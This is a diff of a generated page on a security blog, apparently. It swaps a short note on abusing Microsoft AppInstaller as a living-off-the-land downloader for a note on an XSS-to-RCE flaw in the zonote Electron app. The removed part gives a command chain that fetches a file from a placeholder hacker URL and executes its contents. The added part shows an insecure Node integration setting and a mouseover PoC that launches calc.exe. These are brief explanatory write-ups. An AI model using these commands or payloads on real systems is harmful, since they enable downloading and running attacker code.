@@ -19,14 +19,14 @@
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
-  <meta property="og:title" content="[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download - hackyboiz">
+  <meta property="og:title" content="[하루한줄] CVE-2020-35717: RCE through XSS - hackyboiz">
   <meta property="og:description" content="hack &amp; life">
   <meta property="og:image" content="/img/favicon.ico">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
-  <link rel="canonical" href="https://hackyboiz.github.io/2020/12/03/idioth/2020-12-03/">
+  <link rel="canonical" href="https://hackyboiz.github.io/2021/01/06/fabu1ous/2021-01-06/">
 
-  <title>[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download - hackyboiz</title>
+  <title>[하루한줄] CVE-2020-35717: RCE through XSS - hackyboiz</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
@@ -178,8 +178,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-12-03 18:00" pubdate>
-      2020년 12월 3일 오후
+    <time datetime="2021-01-06 18:00" pubdate>
+      2021년 1월 6일 오후
     </time>
   </div>
 
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      169 자
+      168 자
     </span>
   
 
@@ -231,20 +231,41 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download</h1>
+            <h1 style="display: none">[하루한줄] CVE-2020-35717: RCE through XSS</h1>
             
             <div class="markdown-body" id="post-body">
-              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://twitter.com/notwhickey/status/1333900137232523264">https://twitter.com/notwhickey/status/1333900137232523264</a></p>
-<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
-<li>Microsoft AppInstaller</li>
+              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://medium.com/bugbountywriteup/remote-code-execution-through-cross-site-scripting-in-electron-f3b891ad637">zonote RCE through XSS</a></p>
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>zonote &lt;= 0.4.0</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>문서 작성 Electron App인 zonote에서 RCE 취약점이 공개되었습니다. zonote 문서에 마크다운과 html을 삽입해 XSS(Cross-Site-Script) 공격을 할 수 있는데 악용 범위를 RCE까지 확장할 수 있습니다. </p>
+<blockquote>
+<p>It is paramount that you do not enable Node.js integration in any renderer (<code>BrowserWindow</code>, <code>BrowserView</code>, or <code>&lt;webview&gt;</code>) that loads remote content.</p>
+</blockquote>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">Electron의 공식문서</a>에 따르면 원격 콘텐츠에 접근하는 모든 renderer는 Node.js intergration이 비활성화되어있어야 합니다. XSS 취약점이 존재해도 그 악용 범위를 renderer 내부로 제한하기 위해 Electron 5.0.0부터 권장해온 기본 설정입니다. </p>
+<ul>
+<li>다음은 zonote의 main.js코드 일부입니다.</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installer에서 arbitrary file download를 하여 lolbin(<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)으로 활용할 수 있는 방법이 발견되었습니다.</p>
-<p>웹 서버에서 앱 패키지를 다운로드할 때 과정을 간소화하여 효율적으로 하기 위해 웹 서버에서 직접 앱을 설치할 수 있는 기능을 제공합니다. 웹 페이지에서 앱 패키지를 호스팅 하기 위해서 <code>ms-appinstaller:?source=</code> URI를 사용하여 <code>source=</code>에 명시된 주소에 있는 파일에 대한 앱 다운로드를 진행합니다. 이를 악용하여 해커는 자신의 악성 파일을 source에 작성하여 arbitrary file download을 진행할 수 있고 <code>forfiles</code> 명령어를 통해 앱 패키지 다운로드가 진행된 경로에서 파일을 조건문 등으로 검색하여 실행이 가능합니다.</p>
-<pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NUL
+<pre><code class="hljs js"><span class="hljs-keyword">const</span> browserWindowsOptions = &#123;
+    ...
+    webPreference: &#123;
+        nodeIntergration : <span class="hljs-literal">true</span>,
+        enableRemoteModule : <span class="hljs-literal">true</span>
+    &#125;
+&#125;</code></pre>
 
-forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&#x27;type @path&#x27;) do (%</span>g);&quot; &gt; NUL</code></pre>
+<p>Node.js intergration이 활성화되어있으므로 XSS를 통한 RCE 취약점이 존재합니다.</p>
+<ul>
+<li>PoC</li>
+</ul>
+<pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onemouseover</span>=<span class="hljs-string">&quot;</span></span></span>
+<span class="xml">try&#123;</span>
+<span class="xml">	const &#123;shell&#125; = require(&#x27;electron&#x27;);</span>
+<span class="xml">	shell.openExternal(&#x27;file:C:/Windows/System32/calc.exe&#x27;)</span>
+<span class="xml">&#125;catch(e)&#123;</span>
+<span class="xml">	console.error(e)</span>
+<span class="xml">&#125;&quot;&gt;</span>Hover Me<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>
 
-<p><img src="/2020/12/03/idioth/2020-12-03/image.png" srcset="/img/loading.gif"></p>
+
+
 
             </div>
             <hr>
@@ -262,15 +283,13 @@ forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-sy
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/arbitrary-file-download/">arbitrary file download</a>
+                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
                   
-                  <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
+                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
                   
-                  <a class="hover-with-bg" href="/tags/lolbin/">lolbin</a>
+                  <a class="hover-with-bg" href="/tags/rce/">rce</a>
                   
-                  <a class="hover-with-bg" href="/tags/lolbas/">lolbas</a>
-                  
-                  <a class="hover-with-bg" href="/tags/appinstaller/">appinstaller</a>
+                  <a class="hover-with-bg" href="/tags/xss/">xss</a>
                   
                 </div>
                 
@@ -279,16 +298,16 @@ forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-sy
               <div class="post-metas mb-3">
                 <a class="hover-with-bg" style="display: flex;" href="/author">
                   <div class="link-avatar-page">
-                    <img src="/img/profile_idioth.jpg" srcset="/img/loading.gif" alt="idioth">
+                    <img src="/img/profile_Fabu1ous.jpg" srcset="/img/loading.gif" alt="Fabu1ous">
                   </div>
 
                   <div class="link-text">
-                    <div class="link-title">idioth</div>
+                    <div class="link-title">Fabu1ous</div>
                   </div>
                 </a>
                 <div class="link-text">
                   <div class="link-more">
-                    <a href="/tags/idioth">
+                    <a href="/tags/Fabu1ous">
                       Read more
                       <i class="iconfont icon-arrowdown"></i>
                     </a>
@@ -309,18 +328,12 @@ forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-sy
                 <article class="post-prev col-6">
                   
                   
-                  <a href="/2020/12/04/l0ch/2020-12-04/">
-                    <i class="iconfont icon-arrowleft"></i>
-                    <span class="hidden-mobile">[하루한줄] Chrome UAF in StopProfiler</span>
-                    <span class="visible-mobile">Previous</span>
-                  </a>
-                  
                 </article>
                 <article class="post-next col-6">
                   
                   
-                  <a href="/2020/12/02/fabu1ous/2020-12-02/">
-                    <span class="hidden-mobile">[하루한줄] CVE-2020-14418 : madCodeHook library LPE</span>
+                  <a href="/2021/01/05/l0ch/2021-01-05/">
+                    <span class="hidden-mobile">[하루한줄] CVE-2020-35489 : Unrestricted File Upload Vulnerability in WordPress Plugin</span>
                     <span class="visible-mobile">Next</span>
                     <i class="iconfont icon-arrowright"></i>
                   </a>
@@ -339,8 +352,8 @@ forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-sy
     <div id="disqus_thread"></div>
     <script type="text/javascript">
       var disqus_config = function () {
-        this.page.url = 'https://hackyboiz.github.io/2020/12/03/idioth/2020-12-03/';
-        this.page.identifier = '/2020/12/03/idioth/2020-12-03/';
+        this.page.url = 'https://hackyboiz.github.io/2021/01/06/fabu1ous/2021-01-06/';
+        this.page.identifier = '/2021/01/06/fabu1ous/2021-01-06/';
       };
       function loadDisqus() {
         (function () {
@@ -486,7 +499,7 @@ forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-sy
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download&nbsp;",
+        "[하루한줄] CVE-2020-35717: RCE through XSS&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
